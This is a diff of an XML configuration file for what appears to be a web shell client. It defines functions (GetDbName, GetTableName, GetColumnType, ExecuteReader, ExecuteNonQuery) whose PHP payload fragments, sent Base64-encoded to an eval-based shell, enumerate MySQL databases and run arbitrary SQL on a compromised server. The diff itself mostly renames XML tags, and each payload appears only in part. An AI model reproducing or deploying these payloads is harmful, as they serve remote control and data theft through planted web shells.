@@ -1,9 +1,10 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
-<CustomShellType>
-  <FuncCodeSetting>
-    <Func>
+<customShellType>
+  <funcCodeSetting>
+    <func>
       <name>GetDbName</name>
-	  <type>phpEval/mysql</type>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
@@ -20,10 +21,11 @@ while($rs=@mysql_fetch_row($q))
 @mysql_close($T);
 echo("|<-");
 die();]]></item>
-    </Func>
-	<Func>
+    </func>
+	<func>
       <name>GetTableName</name>
-	  <type>phpEval/mysql</type>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -42,10 +44,11 @@ while($rs=@mysql_fetch_row($q))
 @mysql_close($T);
 echo("|<-");
 die();]]></item>
-    </Func>
-	<Func>
+    </func>
+	<func>
       <name>GetColumnType</name>
-	  <type>phpEval/mysql</type>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >columnName</funcParam>
@@ -66,10 +69,11 @@ while($rs=@mysql_fetch_row($q))
 @mysql_close($T);
 echo("|<-");
 die();]]></item>
-    </Func>
-	<Func>
+    </func>
+	<func>
       <name>ExecuteReader</name>
-	  <type>phpEval/mysql</type>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
@@ -103,10 +107,11 @@ while($rs=@mysql_fetch_row($q))
 @mysql_close($T);
 echo("|<-");
 die();]]></item>
-    </Func>
-	<Func>
+    </func>
+	<func>
       <name>ExecuteNonQuery</name>
-	  <type>phpEval/mysql</type>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
@@ -128,6 +133,6 @@ echo("\t|\t\r\n");
 @mysql_close($T);
 echo("|<-");
 die();]]></item>
-    </Func>
-  </FuncCodeSetting>
-</CustomShellType>
+    </func>
+  </funcCodeSetting>
+</customShellType>
